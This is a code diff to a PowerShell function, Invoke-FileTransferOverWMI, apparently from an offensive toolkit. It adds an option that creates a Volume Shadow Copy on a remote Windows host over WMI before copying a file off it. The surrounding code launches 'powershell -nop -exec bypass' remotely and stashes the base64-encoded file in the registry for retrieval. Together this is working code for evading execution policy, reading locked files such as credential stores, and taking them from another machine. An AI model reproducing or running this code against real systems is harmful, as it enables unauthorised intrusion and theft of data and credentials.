@@ -950,6 +950,9 @@ function Invoke-FileTransferOverWMI
         [string]$Upload,
         [Parameter(Mandatory = $False,ParameterSetName='upload')]
         [Parameter(ParameterSetName='download')]
+        [switch]$ShadowCopy,
+        [Parameter(Mandatory = $False,ParameterSetName='upload')]
+        [Parameter(ParameterSetName='download')]
         [switch]$Execute
     )
     Process
@@ -1009,12 +1012,20 @@ function Invoke-FileTransferOverWMI
 
                 elseif($Download)
                 {
+                    if($ShadowCopy)
+                    {
+                        if($File.length -gt 2)
+                        {
+                            $Drive = $File.substring(0,2)
+                        }
+                        Write-Verbose "Creating shadow copy on remote system"
+                        (Get-WmiObject -list win32_shadowcopy -Computer $computer -Credential $remotecred).create($Drive,"ClientAccessible")
+                    }
                     # On remote system, save file to registry
                     Write-Verbose "Reading remote file and writing on remote registry"
                     $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
                     $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
                     Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $remotecred -Computername $computer
-                    
                     Write-Verbose "Sleeping to let remote system read and store file"
                     Start-Sleep -s 15
 
